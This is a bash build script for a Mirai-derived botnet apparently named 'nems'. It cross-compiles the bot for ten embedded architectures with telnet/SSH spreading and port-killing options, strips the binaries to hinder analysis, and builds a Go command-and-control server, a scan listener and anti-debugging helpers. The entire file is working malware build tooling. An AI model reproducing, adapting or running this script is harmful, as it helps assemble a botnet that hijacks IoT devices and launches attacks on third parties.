#!/bin/bash

FLAGS=""

function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}

if [ $# == 2 ]; then
    if [ "$2" == "telnet" ]; then
        FLAGS="-DMIRAI_TELNET"
    elif [ "$2" == "ssh" ]; then
        FLAGS="-DMIRAI_SSH"
    fi
else
    echo "Missing build type." 
    echo "Usage: $0 <debug | release> <telnet | ssh>"
fi

if [ $# == 0 ]; then
    echo "Usage: $0 <debug | release> <telnet | ssh>"
elif [ "$1" == "release" ]; then
    rm release/nems.*
    rm release/nemsnt.*
    go build -o release/cnc cnc/*.go
    compile_bot i586 nems.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mips nems.mips "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot mipsel nems.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv4l nems.arm "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot armv5l nems.arm5n "$FLAGS -DKILLER_REBIND_SSH"
    compile_bot armv6l nems.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot powerpc nems.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sparc nems.spc "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot m68k nems.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
    compile_bot sh4 nems.sh4 "$FLAGS -DKILLER_REBIND_SSH -static"

    compile_bot i586 nemsnt.x86 "-static"
    compile_bot mips nemsnt.mips "-static"
    compile_bot mipsel nemsnt.mpsl "-static"
    compile_bot armv4l nemsnt.arm "-static"
    compile_bot armv5l nemsnt.arm5n " "
    compile_bot armv6l nemsnt.arm7 "-static"
    compile_bot powerpc nemsnt.ppc "-static"
    compile_bot sparc nemsnt.spc "-static"
    compile_bot m68k nemsnt.m68k "-static"
    compile_bot sh4 nemsnt.sh4 "-static"

    go build -o release/scanListen tools/scanListen.go
elif [ "$1" == "debug" ]; then
    gcc -std=c99 bot/*.c -DDEBUG "$FLAGS" -static -g -o debug/nems.dbg
    mips-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/nems.mips
    armv4l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/nems.arm
    armv6l-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/nems.arm7
    sh4-gcc -std=c99 -DDEBUG bot/*.c "$FLAGS" -static -g -o debug/nems.sh4
    gcc -std=c99 tools/enc.c -g -o debug/enc
    gcc -std=c99 tools/nogdb.c -g -o debug/nogdb
    gcc -std=c99 tools/badbot.c -g -o debug/badbot
    go build -o debug/cnc cnc/*.go
    go build -o debug/scanListen tools/scanListen.go
else
    echo "Unknown parameter $1: $0 <debug | release>"
fi
